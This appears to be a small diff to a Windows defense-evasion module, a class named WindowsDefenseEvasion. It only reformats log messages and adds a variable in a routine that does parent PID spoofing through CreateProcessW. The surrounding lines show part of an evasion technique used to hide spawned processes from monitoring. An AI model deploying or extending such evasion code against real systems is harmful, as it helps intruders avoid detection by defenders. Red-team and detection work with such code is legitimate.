@@ -150,7 +150,8 @@ class WindowsDefenseEvasion:
         try:
             parent_pid = int(parent_pid_str)
             self.logger.info(
-                f"Attempting Parent PID Spoofing: Target Parent PID={parent_pid}, Command='{command_to_run}'"
+                f"Attempting Parent PID Spoofing: Target Parent PID={parent_pid}, "
+                f"Command='{command_to_run}'"
             )
             result_details["target_parent_pid"] = parent_pid
             result_details["command_to_run"] = command_to_run
@@ -207,7 +208,8 @@ class WindowsDefenseEvasion:
             command_line_buffer = ctypes.create_unicode_buffer(command_to_run)
 
             self.logger.info(
-                f"Calling CreateProcessW for command: '{command_to_run}' with spoofed parent PID {parent_pid}"
+                f"Calling CreateProcessW for command: '{command_to_run}' "
+                f"with spoofed parent PID {parent_pid}"
             )
             success = win32process.CreateProcessW(
                 None,  # lpApplicationName
@@ -226,8 +228,9 @@ class WindowsDefenseEvasion:
                 status = "success"
                 result_details["spawned_process_id"] = process_info.dwProcessId
                 result_details["spawned_thread_id"] = process_info.dwThreadId
+                new_pid = process_info.dwProcessId
                 self.logger.info(
-                    f"Successfully created process PID {process_info.dwProcessId} with parent PID {parent_pid}"
+                    f"Successfully created process PID {new_pid} with parent PID {parent_pid}"
                 )
                 # Close handles for the new process
                 win32api.CloseHandle(process_info.hProcess)
